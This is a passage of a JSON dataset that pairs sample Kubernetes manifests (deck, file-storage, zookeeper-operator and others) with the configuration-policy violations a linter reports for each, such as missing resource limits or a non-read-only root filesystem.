    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: java-goof-deployment\n  labels:\n    app: java-goof\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: java-goof\n  template:\n    metadata:\n      labels:\n        app: java-goof\n    spec:\n      containers:\n      - name: java-goof\n        image: omearaj/java-goof\n        ports:\n        - containerPort: 8080\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"java-goof\" has memory limit 0"
  },
  {
    "id": "9272",
    "manifest_path": "data/manifests/the_stack_sample/sample_3508.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: deck\n  labels:\n    app: deck\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: deck\n  template:\n    metadata:\n      labels:\n        app: deck\n    spec:\n      serviceAccountName: deck\n      containers:\n      - name: deck\n        image: gcr.io/k8s-prow/deck:v20200513-6ad6776a6\n        imagePullPolicy: Always\n        ports:\n        - name: http\n          containerPort: 8080\n        args:\n        - --kubeconfig=/etc/kubeconfig/config\n        - --tide-url=http://tide/\n        - --hook-url=http://hook:8888/plugin-help\n        - --redirect-http-to=prow.k8s.io\n        - --oauth-url=/github-login\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --spyglass=true\n        - --rerun-creates-job\n        - --github-token-path=/etc/github/oauth\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-oauth-config-file=/etc/githuboauth/secret\n        - --cookie-secret=/etc/cookie/secret\n        - --plugin-config=/etc/plugins/plugins.yaml\n        volumeMounts:\n        - name: oauth-config\n          mountPath: /etc/githuboauth\n          readOnly: true\n        - name: cookie-secret\n          mountPath: /etc/cookie\n          readOnly: true\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: oauth-token\n          mountPath: /etc/github\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: oauth-config\n        secret:\n          secretName: github-oauth-config\n      - name: oauth-token\n        secret:\n          secretName: oauth-token\n      - name: cookie-secret\n        secret:\n          secretName: cookie\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "liveness-port",
    "violation_text": "container \"deck\" does not expose port 8081 for the HTTPGet"
  },
  {
    "id": "9273",
    "manifest_path": "data/manifests/the_stack_sample/sample_3508.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: deck\n  labels:\n    app: deck\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: deck\n  template:\n    metadata:\n      labels:\n        app: deck\n    spec:\n      serviceAccountName: deck\n      containers:\n      - name: deck\n        image: gcr.io/k8s-prow/deck:v20200513-6ad6776a6\n        imagePullPolicy: Always\n        ports:\n        - name: http\n          containerPort: 8080\n        args:\n        - --kubeconfig=/etc/kubeconfig/config\n        - --tide-url=http://tide/\n        - --hook-url=http://hook:8888/plugin-help\n        - --redirect-http-to=prow.k8s.io\n        - --oauth-url=/github-login\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --spyglass=true\n        - --rerun-creates-job\n        - --github-token-path=/etc/github/oauth\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-oauth-config-file=/etc/githuboauth/secret\n        - --cookie-secret=/etc/cookie/secret\n        - --plugin-config=/etc/plugins/plugins.yaml\n        volumeMounts:\n        - name: oauth-config\n          mountPath: /etc/githuboauth\n          readOnly: true\n        - name: cookie-secret\n          mountPath: /etc/cookie\n          readOnly: true\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: oauth-token\n          mountPath: /etc/github\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: oauth-config\n        secret:\n          secretName: github-oauth-config\n      - name: oauth-token\n        secret:\n          secretName: oauth-token\n      - name: cookie-secret\n        secret:\n          secretName: cookie\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 3 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "9274",
    "manifest_path": "data/manifests/the_stack_sample/sample_3508.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: deck\n  labels:\n    app: deck\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: deck\n  template:\n    metadata:\n      labels:\n        app: deck\n    spec:\n      serviceAccountName: deck\n      containers:\n      - name: deck\n        image: gcr.io/k8s-prow/deck:v20200513-6ad6776a6\n        imagePullPolicy: Always\n        ports:\n        - name: http\n          containerPort: 8080\n        args:\n        - --kubeconfig=/etc/kubeconfig/config\n        - --tide-url=http://tide/\n        - --hook-url=http://hook:8888/plugin-help\n        - --redirect-http-to=prow.k8s.io\n        - --oauth-url=/github-login\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --spyglass=true\n        - --rerun-creates-job\n        - --github-token-path=/etc/github/oauth\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-oauth-config-file=/etc/githuboauth/secret\n        - --cookie-secret=/etc/cookie/secret\n        - --plugin-config=/etc/plugins/plugins.yaml\n        volumeMounts:\n        - name: oauth-config\n          mountPath: /etc/githuboauth\n          readOnly: true\n        - name: cookie-secret\n          mountPath: /etc/cookie\n          readOnly: true\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: oauth-token\n          mountPath: /etc/github\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: oauth-config\n        secret:\n          secretName: github-oauth-config\n      - name: oauth-token\n        secret:\n          secretName: oauth-token\n      - name: cookie-secret\n        secret:\n          secretName: cookie\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"deck\" does not have a read-only root file system"
  },
  {
    "id": "9275",
    "manifest_path": "data/manifests/the_stack_sample/sample_3508.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: deck\n  labels:\n    app: deck\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: deck\n  template:\n    metadata:\n      labels:\n        app: deck\n    spec:\n      serviceAccountName: deck\n      containers:\n      - name: deck\n        image: gcr.io/k8s-prow/deck:v20200513-6ad6776a6\n        imagePullPolicy: Always\n        ports:\n        - name: http\n          containerPort: 8080\n        args:\n        - --kubeconfig=/etc/kubeconfig/config\n        - --tide-url=http://tide/\n        - --hook-url=http://hook:8888/plugin-help\n        - --redirect-http-to=prow.k8s.io\n        - --oauth-url=/github-login\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --spyglass=true\n        - --rerun-creates-job\n        - --github-token-path=/etc/github/oauth\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-oauth-config-file=/etc/githuboauth/secret\n        - --cookie-secret=/etc/cookie/secret\n        - --plugin-config=/etc/plugins/plugins.yaml\n        volumeMounts:\n        - name: oauth-config\n          mountPath: /etc/githuboauth\n          readOnly: true\n        - name: cookie-secret\n          mountPath: /etc/cookie\n          readOnly: true\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: oauth-token\n          mountPath: /etc/github\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: oauth-config\n        secret:\n          secretName: github-oauth-config\n      - name: oauth-token\n        secret:\n          secretName: oauth-token\n      - name: cookie-secret\n        secret:\n          secretName: cookie\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"deck\" not found"
  },
  {
    "id": "9276",
    "manifest_path": "data/manifests/the_stack_sample/sample_3508.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: deck\n  labels:\n    app: deck\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: deck\n  template:\n    metadata:\n      labels:\n        app: deck\n    spec:\n      serviceAccountName: deck\n      containers:\n      - name: deck\n        image: gcr.io/k8s-prow/deck:v20200513-6ad6776a6\n        imagePullPolicy: Always\n        ports:\n        - name: http\n          containerPort: 8080\n        args:\n        - --kubeconfig=/etc/kubeconfig/config\n        - --tide-url=http://tide/\n        - --hook-url=http://hook:8888/plugin-help\n        - --redirect-http-to=prow.k8s.io\n        - --oauth-url=/github-login\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --spyglass=true\n        - --rerun-creates-job\n        - --github-token-path=/etc/github/oauth\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-oauth-config-file=/etc/githuboauth/secret\n        - --cookie-secret=/etc/cookie/secret\n        - --plugin-config=/etc/plugins/plugins.yaml\n        volumeMounts:\n        - name: oauth-config\n          mountPath: /etc/githuboauth\n          readOnly: true\n        - name: cookie-secret\n          mountPath: /etc/cookie\n          readOnly: true\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: oauth-token\n          mountPath: /etc/github\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: oauth-config\n        secret:\n          secretName: github-oauth-config\n      - name: oauth-token\n        secret:\n          secretName: oauth-token\n      - name: cookie-secret\n        secret:\n          secretName: cookie\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "readiness-port",
    "violation_text": "container \"deck\" does not expose port 8081 for the HTTPGet"
  },
  {
    "id": "9277",
    "manifest_path": "data/manifests/the_stack_sample/sample_3508.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: deck\n  labels:\n    app: deck\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: deck\n  template:\n    metadata:\n      labels:\n        app: deck\n    spec:\n      serviceAccountName: deck\n      containers:\n      - name: deck\n        image: gcr.io/k8s-prow/deck:v20200513-6ad6776a6\n        imagePullPolicy: Always\n        ports:\n        - name: http\n          containerPort: 8080\n        args:\n        - --kubeconfig=/etc/kubeconfig/config\n        - --tide-url=http://tide/\n        - --hook-url=http://hook:8888/plugin-help\n        - --redirect-http-to=prow.k8s.io\n        - --oauth-url=/github-login\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --spyglass=true\n        - --rerun-creates-job\n        - --github-token-path=/etc/github/oauth\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-oauth-config-file=/etc/githuboauth/secret\n        - --cookie-secret=/etc/cookie/secret\n        - --plugin-config=/etc/plugins/plugins.yaml\n        volumeMounts:\n        - name: oauth-config\n          mountPath: /etc/githuboauth\n          readOnly: true\n        - name: cookie-secret\n          mountPath: /etc/cookie\n          readOnly: true\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: oauth-token\n          mountPath: /etc/github\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: oauth-config\n        secret:\n          secretName: github-oauth-config\n      - name: oauth-token\n        secret:\n          secretName: oauth-token\n      - name: cookie-secret\n        secret:\n          secretName: cookie\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"deck\" is not set to runAsNonRoot"
  },
  {
    "id": "9278",
    "manifest_path": "data/manifests/the_stack_sample/sample_3508.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: deck\n  labels:\n    app: deck\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: deck\n  template:\n    metadata:\n      labels:\n        app: deck\n    spec:\n      serviceAccountName: deck\n      containers:\n      - name: deck\n        image: gcr.io/k8s-prow/deck:v20200513-6ad6776a6\n        imagePullPolicy: Always\n        ports:\n        - name: http\n          containerPort: 8080\n        args:\n        - --kubeconfig=/etc/kubeconfig/config\n        - --tide-url=http://tide/\n        - --hook-url=http://hook:8888/plugin-help\n        - --redirect-http-to=prow.k8s.io\n        - --oauth-url=/github-login\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --spyglass=true\n        - --rerun-creates-job\n        - --github-token-path=/etc/github/oauth\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-oauth-config-file=/etc/githuboauth/secret\n        - --cookie-secret=/etc/cookie/secret\n        - --plugin-config=/etc/plugins/plugins.yaml\n        volumeMounts:\n        - name: oauth-config\n          mountPath: /etc/githuboauth\n          readOnly: true\n        - name: cookie-secret\n          mountPath: /etc/cookie\n          readOnly: true\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: oauth-token\n          mountPath: /etc/github\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: oauth-config\n        secret:\n          secretName: github-oauth-config\n      - name: oauth-token\n        secret:\n          secretName: oauth-token\n      - name: cookie-secret\n        secret:\n          secretName: cookie\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"deck\" has cpu request 0"
  },
  {
    "id": "9279",
    "manifest_path": "data/manifests/the_stack_sample/sample_3508.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: deck\n  labels:\n    app: deck\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: deck\n  template:\n    metadata:\n      labels:\n        app: deck\n    spec:\n      serviceAccountName: deck\n      containers:\n      - name: deck\n        image: gcr.io/k8s-prow/deck:v20200513-6ad6776a6\n        imagePullPolicy: Always\n        ports:\n        - name: http\n          containerPort: 8080\n        args:\n        - --kubeconfig=/etc/kubeconfig/config\n        - --tide-url=http://tide/\n        - --hook-url=http://hook:8888/plugin-help\n        - --redirect-http-to=prow.k8s.io\n        - --oauth-url=/github-login\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --spyglass=true\n        - --rerun-creates-job\n        - --github-token-path=/etc/github/oauth\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-oauth-config-file=/etc/githuboauth/secret\n        - --cookie-secret=/etc/cookie/secret\n        - --plugin-config=/etc/plugins/plugins.yaml\n        volumeMounts:\n        - name: oauth-config\n          mountPath: /etc/githuboauth\n          readOnly: true\n        - name: cookie-secret\n          mountPath: /etc/cookie\n          readOnly: true\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: oauth-token\n          mountPath: /etc/github\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: oauth-config\n        secret:\n          secretName: github-oauth-config\n      - name: oauth-token\n        secret:\n          secretName: oauth-token\n      - name: cookie-secret\n        secret:\n          secretName: cookie\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"deck\" has memory limit 0"
  },
  {
    "id": "9280",
    "manifest_path": "data/manifests/the_stack_sample/sample_3510.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: file-storage\n  name: file-storage\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: file-storage\n  template:\n    metadata:\n      labels:\n        app: file-storage\n    spec:\n      containers:\n      - image: 279559645400.dkr.ecr.us-west-1.amazonaws.com/solui/file-storage-service:G8R2i020\n        imagePullPolicy: Always\n        name: file-storage\n        ports:\n        - containerPort: 8000\n        resources: {}\n        volumeMounts:\n        - mountPath: /file-storage-service/.env.defaults\n          subPath: .env\n          name: file-storage-mount\n      volumes:\n      - name: file-storage-mount\n        configMap:\n          name: file-storage-cm\n          defaultMode: 420\n          items:\n          - key: file-storageConfig\n            path: .env\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"file-storage\" does not have a read-only root file system"
  },
  {
    "id": "9281",
    "manifest_path": "data/manifests/the_stack_sample/sample_3510.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: file-storage\n  name: file-storage\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: file-storage\n  template:\n    metadata:\n      labels:\n        app: file-storage\n    spec:\n      containers:\n      - image: 279559645400.dkr.ecr.us-west-1.amazonaws.com/solui/file-storage-service:G8R2i020\n        imagePullPolicy: Always\n        name: file-storage\n        ports:\n        - containerPort: 8000\n        resources: {}\n        volumeMounts:\n        - mountPath: /file-storage-service/.env.defaults\n          subPath: .env\n          name: file-storage-mount\n      volumes:\n      - name: file-storage-mount\n        configMap:\n          name: file-storage-cm\n          defaultMode: 420\n          items:\n          - key: file-storageConfig\n            path: .env\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"file-storage\" is not set to runAsNonRoot"
  },
  {
    "id": "9282",
    "manifest_path": "data/manifests/the_stack_sample/sample_3510.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: file-storage\n  name: file-storage\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: file-storage\n  template:\n    metadata:\n      labels:\n        app: file-storage\n    spec:\n      containers:\n      - image: 279559645400.dkr.ecr.us-west-1.amazonaws.com/solui/file-storage-service:G8R2i020\n        imagePullPolicy: Always\n        name: file-storage\n        ports:\n        - containerPort: 8000\n        resources: {}\n        volumeMounts:\n        - mountPath: /file-storage-service/.env.defaults\n          subPath: .env\n          name: file-storage-mount\n      volumes:\n      - name: file-storage-mount\n        configMap:\n          name: file-storage-cm\n          defaultMode: 420\n          items:\n          - key: file-storageConfig\n            path: .env\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"file-storage\" has cpu request 0"
  },
  {
    "id": "9283",
    "manifest_path": "data/manifests/the_stack_sample/sample_3510.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: file-storage\n  name: file-storage\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: file-storage\n  template:\n    metadata:\n      labels:\n        app: file-storage\n    spec:\n      containers:\n      - image: 279559645400.dkr.ecr.us-west-1.amazonaws.com/solui/file-storage-service:G8R2i020\n        imagePullPolicy: Always\n        name: file-storage\n        ports:\n        - containerPort: 8000\n        resources: {}\n        volumeMounts:\n        - mountPath: /file-storage-service/.env.defaults\n          subPath: .env\n          name: file-storage-mount\n      volumes:\n      - name: file-storage-mount\n        configMap:\n          name: file-storage-cm\n          defaultMode: 420\n          items:\n          - key: file-storageConfig\n            path: .env\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"file-storage\" has memory limit 0"
  },
  {
    "id": "9284",
    "manifest_path": "data/manifests/the_stack_sample/sample_3511.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: endorsement-ui\n  namespace: bbt-endorsement\nspec:\n  type: LoadBalancer\n  ports:\n  - port: 80\n    targetPort: 80\n  selector:\n    app: endorsement-ui\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:endorsement-ui])"
  },
  {
    "id": "9285",
    "manifest_path": "data/manifests/the_stack_sample/sample_3513.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: zookeeper-operator\n  namespace: zookeeper\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: zookeeper-operator\n  template:\n    metadata:\n      labels:\n        name: zookeeper-operator\n    spec:\n      serviceAccountName: zookeeper-operator\n      containers:\n      - name: zookeeper-operator\n        image: uhub.service.ucloud.cn/infra/zookeeper-operator:v1\n        ports:\n        - containerPort: 60000\n          name: metrics\n        command:\n        - zookeeper-operator\n        imagePullPolicy: Always\n        env:\n        - name: WATCH_NAMESPACE\n          value: zookeeper\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: OPERATOR_NAME\n          value: zookeeper-operator\n        - name: PENDING_TIMEOUT_TIME\n          value: '120'\n        - name: TERMINATING_TIMEOUT_TIME\n          value: '360'\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"zookeeper-operator\" does not have a read-only root file system"
  },
  {
    "id": "9286",
    "manifest_path": "data/manifests/the_stack_sample/sample_3513.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: zookeeper-operator\n  namespace: zookeeper\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: zookeeper-operator\n  template:\n    metadata:\n      labels:\n        name: zookeeper-operator\n    spec:\n      serviceAccountName: zookeeper-operator\n      containers:\n      - name: zookeeper-operator\n        image: uhub.service.ucloud.cn/infra/zookeeper-operator:v1\n        ports:\n        - containerPort: 60000\n          name: metrics\n        command:\n        - zookeeper-operator\n        imagePullPolicy: Always\n        env:\n        - name: WATCH_NAMESPACE\n          value: zookeeper\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: OPERATOR_NAME\n          value: zookeeper-operator\n        - name: PENDING_TIMEOUT_TIME\n          value: '120'\n        - name: TERMINATING_TIMEOUT_TIME\n          value: '360'\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"zookeeper-operator\" not found"
  },
  {
    "id": "9287",
    "manifest_path": "data/manifests/the_stack_sample/sample_3513.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: zookeeper-operator\n  namespace: zookeeper\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: zookeeper-operator\n  template:\n    metadata:\n      labels:\n        name: zookeeper-operator\n    spec:\n      serviceAccountName: zookeeper-operator\n      containers:\n      - name: zookeeper-operator\n        image: uhub.service.ucloud.cn/infra/zookeeper-operator:v1\n        ports:\n        - containerPort: 60000\n          name: metrics\n        command:\n        - zookeeper-operator\n        imagePullPolicy: Always\n        env:\n        - name: WATCH_NAMESPACE\n          value: zookeeper\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: OPERATOR_NAME\n          value: zookeeper-operator\n        - name: PENDING_TIMEOUT_TIME\n          value: '120'\n        - name: TERMINATING_TIMEOUT_TIME\n          value: '360'\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"zookeeper-operator\" is not set to runAsNonRoot"
  },
  {
    "id": "9288",
    "manifest_path": "data/manifests/the_stack_sample/sample_3513.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: zookeeper-operator\n  namespace: zookeeper\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: zookeeper-operator\n  template:\n    metadata:\n      labels:\n        name: zookeeper-operator\n    spec:\n      serviceAccountName: zookeeper-operator\n      containers:\n      - name: zookeeper-operator\n        image: uhub.service.ucloud.cn/infra/zookeeper-operator:v1\n        ports:\n        - containerPort: 60000\n          name: metrics\n        command:\n        - zookeeper-operator\n        imagePullPolicy: Always\n        env:\n        - name: WATCH_NAMESPACE\n          value: zookeeper\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: OPERATOR_NAME\n          value: zookeeper-operator\n        - name: PENDING_TIMEOUT_TIME\n          value: '120'\n        - name: TERMINATING_TIMEOUT_TIME\n          value: '360'\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"zookeeper-operator\" has cpu request 0"
  },
  {
    "id": "9289",
    "manifest_path": "data/manifests/the_stack_sample/sample_3513.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: zookeeper-operator\n  namespace: zookeeper\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: zookeeper-operator\n  template:\n    metadata:\n      labels:\n        name: zookeeper-operator\n    spec:\n      serviceAccountName: zookeeper-operator\n      containers:\n      - name: zookeeper-operator\n        image: uhub.service.ucloud.cn/infra/zookeeper-operator:v1\n        ports:\n        - containerPort: 60000\n          name: metrics\n        command:\n        - zookeeper-operator\n        imagePullPolicy: Always\n        env:\n        - name: WATCH_NAMESPACE\n          value: zookeeper\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: OPERATOR_NAME\n          value: zookeeper-operator\n        - name: PENDING_TIMEOUT_TIME\n          value: '120'\n        - name: TERMINATING_TIMEOUT_TIME\n          value: '360'\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"zookeeper-operator\" has memory limit 0"
  },
  {
    "id": "9290",
    "manifest_path": "data/manifests/the_stack_sample/sample_3516.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: discovery\nspec:\n  selector:\n    app: akri\n    protocol: http\n  ports:\n  - port: 9999\n    protocol: TCP\n    targetPort: 9999\n  type: ClusterIP\n",
